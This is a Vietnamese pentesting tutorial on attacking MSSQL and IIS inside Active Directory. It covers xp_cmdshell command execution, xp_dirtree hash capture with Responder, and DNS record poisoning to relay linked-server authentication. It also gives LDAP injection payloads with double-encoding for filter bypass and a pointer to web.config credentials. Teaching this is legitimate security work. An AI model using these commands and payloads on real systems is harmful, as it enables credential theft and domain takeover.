---
layout: post
title: "Dịch Vụ Microsoft Mở Rộng"
categories: [Mindmap]
---

Active Directory không bao giờ đứng cô đơn. Để phục vụ kinh doanh, doanh nghiệp buộc phải cài đặt thêm các tầng dịch vụ như cơ sở dữ liệu (MSSQL) hay máy chủ Web (IIS).

Điểm yếu chết người nằm ở chỗ: các dịch vụ này buộc phải có một danh phận (Service Account) để giao tiếp với AD. Một sai lầm nhỏ trong cấu hình truy vấn LDAP hay một chuỗi kết nối Database bị lộ lọt cũng đủ để kẻ tấn công từ một kẻ ngoại đạo trở thành người nắm giữ chìa khóa của những tài khoản quan trọng nhất. Hãy cùng bóc tách cách chúng ta 'lạm dụng' những sự kết nối này

### **1. MSSQL**
Trong cấu trúc Mindmap AD của chúng ta, các dịch vụ Microsoft mở rộng chính là những "cửa sổ không khóa". Và MSSQL chính là cánh cửa sổ to nhất, hớ hênh nhất mà Pentester luôn nhắm tới đầu tiên. Tại sao? Vì nó thường chạy dưới quyền một Service Account trong Domain và cấu hình xác thực cực kỳ "thông thoáng".

Lỗ hổng MSSQL có thể đến từ SQL Injection trên Web, nhưng nếu bạn đã có một tài khoản, hãy thử đăng nhập trực tiếp qua cổng 1433.

Điều đầu tiên ta cần phân biệt hai chế độ xác thực:

```bash
# Dùng tài khoản miền
mssqlclient.py <tên_miền>/<user>:<pass>@<IP_mục_tiêu> -windows-auth

# Dùng tài khoản local
mssqlclient.py <user>:<pass>@<IP_mục_tiêu>
```

Khi đã vào được trong, đừng gõ bừa bãi. Hãy dùng các lệnh có sẵn của **impacket-mssqlclient** để xem mình đang đứng ở đâu và có quyền gì:
* enum_db: Liệt kê các database. Hãy chú ý các DB lạ, đôi khi admin lưu mật khẩu backup trong đó.
* enum_logins: Xem danh sách người dùng đã/có quyền đăng nhập vào đây.
* enum_impersonate: Kiểm tra xem bạn có quyền nhập hồn ai không, nếu có thì tùy output bạn dùng lệnh execute_as_login <user> hoặc execute_as_user <user> để giả mạo họ.
* enum_links: Liệt kê các máy chủ mssql khác được liên kết.
* use_link <link>: Sử dụng máy chủ được liên liên kết

Nếu có quyền cao, ta có thể dùng 2 lệnh sau để lấy shell trên máy host dịch vụ MSSQL này:
* enable_xp_cmdshell: Bật Procedure xp_cmdshell.
* xp_cmdshell <lệnh>: Nếu xp_cmdshell bị chặn, dùng sp_start_job <lệnh> nhưng lệnh này sẽ chạy ngầm nên bạn cần phải tạo một reverse shell.



MSSQL còn có một Procedure là xp_dirtree. Lạm dụng nó là một đòn tấn công êm ái, thụ động. Ta ép SQL Server truy cập vào một đường dẫn mạng (UNC path) giả mạo do ta kiểm soát để bắt lấy Hash của tài khoản chạy dịch vụ SQL.

```bash
# Trên máy tấn công bật responder
sudo responder -I tun0 -v

# Trên mssql shell
xp_dirtree "\\<IP_máy_tấn_công>\test"
```

Có một thuật nâng cao khác là mượn xác hoàn hồn qua Linked Servers. Khi bạn use_link một máy chủ liên kết nhưng bị timeout, nó đã chết. Khi đó ta sẽ điều hướng record DNS của máy đó trỏ về IP máy tấn công (Ở đây tôi dùng **dnstool.py** của bộ https://github.com/dirkjanm/krbrelayx/tree/master), bật **Responder** và ép nó xác thực về.

```bash
# Trên máy tấn công
python3 dnstool.py -u <tên_miền>\<user> -p <pass> --action add --record <link> --data <IP_máy_tấn_công> <IP_DC>
sudo responder -I tun0 -v

# Trên mssql shell
EXEC ('') AT [<link>];
```

### **2. IIS**

Khi một trang web trên IIS cho phép đăng nhập hoặc tìm kiếm nhân viên bằng tài khoản miền, nó sẽ gửi một câu truy vấn LDAP. Nếu code không lọc kỹ các ký tự đặc biệt, ta có thể thay đổi logic của câu truy vấn đó bằng cách chèn các toán tử LDAP như *, (, ), &, | vào các trường nhập liệu.
Thông thường, lập trình viên sẽ thiết lập một bộ lọc (LDAP Filter) để tìm đúng đối tượng User trong rừng AD khổng lồ. Câu lệnh ở Backend thường có dạng:

```
(&(sAMAccountName={user_input})(objectClass=user)(memberOf=CN=WebUsers,CN=Users,DC=luv,DC=local))
```
* &: Toán tử AND (tất cả điều kiện phải đúng).
* sAMAccountName: Tên đăng nhập.
* memberOf: Rào chắn để chỉ cho phép người dùng thuộc nhóm WebUsers mới được vào.

Nếu ứng dụng chỉ đơn thuần lấy user_input từ bạn và ghép vào chuỗi trên mà không lọc các ký tự điều khiển LDAP (( ) & | * =), ta có thể kết thúc sớm điều kiện này và chèn thêm điều kiện khác vào.
* Nếu ta nhập Username là ```admin)(description=*``` câu truy vấn trở thành ```(&(sAMAccountName=admin)(description=*)(objectClass=user)...)``` -> Lúc này, nếu mật khẩu bạn nhập bừa nhưng LDAP tìm thấy User admin có thuộc tính description bất kỳ, logic có thể bị đánh lừa tùy vào cách App xử lý kết quả trả về.
* Nếu ta nhập ```admin*)(|(sAMAccountName=*``` câu lệnh bị biến dạng thành ```(&(sAMAccountName=admin*)(|(sAMAccountName=*)(objectClass=user)...)``` -> Dấu * (Wildcard) khiến bộ lọc khớp với mọi người dùng, và toán tử | (OR) có thể làm vô hiệu hóa các điều kiện kiểm tra nhóm phía sau.

Trong thực tế, các hệ thống Web hoặc Web Application Firewall (WAF) thường có các lớp lọc cơ bản để chặn các ký tự lạ.
* Fuzzing: Để tìm ra khe hở — những ký tự nào bị chặn, ký tự nào lọt qua được (ví dụ: chặn * nhưng cho phép %).
* Double Encoding: Lợi dụng việc trình duyệt decode 1 lần và App decode thêm 1 lần nữa để đưa các ký tự cấm vào sâu trong câu truy vấn LDAP mà không bị bộ lọc phát hiện ở vòng ngoài.

| Ký tự | URL Encode | Double Encode |
| :--- | :---: | :--- |
| **\*** | `%2A` | `%252A` |
| **(** | `%28` | `%2528` |
| **)** | `%29` | `%2529` |
| **=** | `%3D` | `%253D` |
| **&** | `%26` | `%2526` |
| **\|** | `%7C` | `%257C` |

Nếu ta không nhận được kết quả trực tiếp, ta phải dựa vào phản hồi của Web để đoán định:
* TRUE: Câu truy vấn trả về kết quả (Web báo: "Sai mật khẩu" hoặc "Tài khoản đã tồn tại").
* FALSE: Câu truy vấn không khớp ai (Web báo: "Người dùng không tồn tại").

Từ hai trạng thái này, ta có thể dò tìm từng ký tự của các thuộc tính trong AD như description chỉ bằng cách hỏi: "Có phải description của người dùng này bắt đầu bằng chữ a không?"
Giả sử câu truy vấn ở Backend là:

```
(&(sAMAccountName={user_input})(objectClass=user))
```

Để dò thuộc tính description của user admin, ta sẽ tiêm vào trường user_input payload ```admin*)(description=a*``` khi đó, câu truy vấn đầy đủ sẽ trở thành: ```(&(sAMAccountName=admin*)(description=a*)(objectClass=user))```

Trong thế giới ASP.NET chạy trên IIS, web.config (C:\inetpub\wwwroot\<tên_App>\web.config) là file quan trọng nhất. Nó chứa mọi thông tin cấu hình để ứng dụng có thể vận hành và kết nối với các thành phần khác nên bất cứ khi nào bạn có quyền đọc file trên một máy chủ IIS (qua LFI hoặc chiếm được shell), việc đầu tiên là phải đọc file này.
